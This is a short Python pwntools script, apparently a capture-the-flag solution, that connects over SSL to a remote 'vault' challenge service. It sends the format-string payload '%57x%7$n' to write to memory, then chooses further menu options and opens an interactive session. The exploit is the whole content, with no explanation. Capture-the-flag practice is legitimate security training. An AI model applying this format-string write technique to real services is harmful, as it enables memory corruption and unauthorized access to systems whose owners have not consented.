from pwn import *

# p = process("./vault")
# gdb.attach(p)
p = remote('wackattack-0cb6-vault.ept.gg', 1337, ssl=True)

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"vault: ", b"%57x%7$n")

p.sendlineafter(b"choice: ", b"1")
p.sendlineafter(b"vault: ", b"A")

p.sendlineafter(b"choice: ", b"5")
p.interactive()